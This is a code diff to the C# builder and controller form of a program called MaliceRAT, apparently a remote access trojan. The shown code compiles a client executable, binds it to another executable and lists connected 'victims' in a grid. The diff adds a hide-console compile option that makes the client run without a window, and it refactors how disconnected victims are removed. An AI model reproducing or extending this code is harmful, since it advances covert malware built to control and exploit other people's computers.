@@ -14,7 +14,7 @@ namespace MaliceRAT
     public partial class Main : Form
     {
         readonly Server server = new Server();
-
+        
         public Main()
         {
             InitializeComponent();
@@ -23,7 +23,6 @@ namespace MaliceRAT
             server.InfoReceived += Server_InfoReceived;
             server.ClientDisconnected += Server_ClientDisconnected;
         }
-
        private async Task<string> CompileClientExeAsync()
         {
             string sourceCode;
@@ -57,7 +56,7 @@ namespace MaliceRAT
             {
                 GenerateExecutable = true,
                 OutputAssembly = Path.Combine(Application.StartupPath, "client.exe"),
-                CompilerOptions = "/optimize",
+                CompilerOptions = gunaHideConsole.Checked ? "/optimize /target:winexe" : "/optimize",
                 ReferencedAssemblies = {
                     "System.dll",
                     "System.Core.dll",
@@ -86,7 +85,6 @@ namespace MaliceRAT
             }
             return parameters.OutputAssembly;
         }
-
         private byte[] CombineExeFiles(string exe1, string exe2)
         {
             byte[] exe1Bytes = File.ReadAllBytes(exe1);
@@ -98,7 +96,6 @@ namespace MaliceRAT
 
             return combinedBytes;
         }
-
         private async void buildButton_Click(object sender, EventArgs e)
         {
             string exePath = await CompileClientExeAsync();
@@ -121,7 +118,6 @@ namespace MaliceRAT
                 }
             }
         }
-
         private void gunaButton1_Click(object sender, EventArgs e)
         {
             using (OpenFileDialog openFileDialog = new OpenFileDialog())
@@ -165,10 +161,18 @@ namespace MaliceRAT
         public void RemoveVictimFromGrid(Victim victim) {
             if (guna2DataGridView1.InvokeRequired) {
                 guna2DataGridView1.Invoke(new Action(() => {
-                    guna2DataGridView1.Rows.Remove(guna2DataGridView1.Rows[victim.Id]);
+                    RemoveVictimById(victim.Id);
                 }));
             } else {
-                guna2DataGridView1.Rows.Remove(guna2DataGridView1.Rows[victim.Id]);
+                RemoveVictimById(victim.Id);
+            }
+        }
+        private void RemoveVictimById(int id) {
+            foreach (DataGridViewRow row in guna2DataGridView1.Rows) {
+                if (row.Cells["ID"].Value != null && (int)row.Cells["ID"].Value == id) {
+                    guna2DataGridView1.Rows.Remove(row);
+                    break;
+                }
             }
         }
         private async void Server_InfoReceived(Victim client) 
